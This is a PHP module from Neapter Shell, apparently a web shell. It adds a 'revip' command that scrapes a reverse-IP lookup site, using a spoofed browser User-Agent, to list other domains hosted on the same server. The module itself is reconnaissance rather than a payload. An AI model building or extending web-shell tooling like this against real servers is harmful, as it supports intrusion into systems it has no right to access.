<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Reverse IP
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleRevip extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array( 'revip' );
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.00 2011-09-12 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Revip

	Użycie:
		revip host_lub_ip

	Przykład:
		revip przemo.org
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( ( $this -> oShell -> iArgc !== 1 ) || ( $this -> oShell -> aArgv[0] === 'help' ) )
		{
			return $this -> getHelp();
		}

		/**
		 * Naglowki
		 */
		$aStream = array
		(
			'http' => array
			(
				'method' => 'GET',
				'header' => "User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11\r\n" .
					    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
			)
		);

		/**
		 * Pobieranie danych
		 */
		if( ( $sData = file_get_contents( 'http://www.ip-adress.com/reverse_ip/' . $this -> oShell -> aArgv[0], FALSE, stream_context_create( $aStream ) ) ) === FALSE )
		{
			return 'Nie można połączyć się z serwerem';
		}

		/**
		 * Zly host
		 */
		if( strpos( $sData, 'could not be resolved. Make sure that you enter an valid IP address, host or domainname' ) )
		{
			return 'Nie można przetłumacz hosta';
		}

		/**
		 * Zly host
		 */
		if( strpos( $sData, '<div id="hostcount">0 Hosts on this IP</div>' ) )
		{
			return 'Brak adresów IP';
		}

		/**
		 * Wyciaganie danych
		 */
		if( ! preg_match( '~<table class="list">(.+?)</table>~s', $sData, $aData ) )
		{
			return 'Wystąpił błąd podczas wyciągania danych';
		}

		/**
		 * Wyciaganie danych
		 */
		if( ! preg_match_all( '~<td>\r\n(.+?)</td>~', $aData[1], $aData ) )
		{
			return 'Wystąpił błąd podczas wyciągania hostów';
		}

		/**
		 * Wyswietlanie adresow
		 */
		return sprintf( "Zwrócono %d witryn:\r\n\r\n\t%s",  count( $aData[1] ), implode( "\r\n\t", $aData[1] ) );
	}

}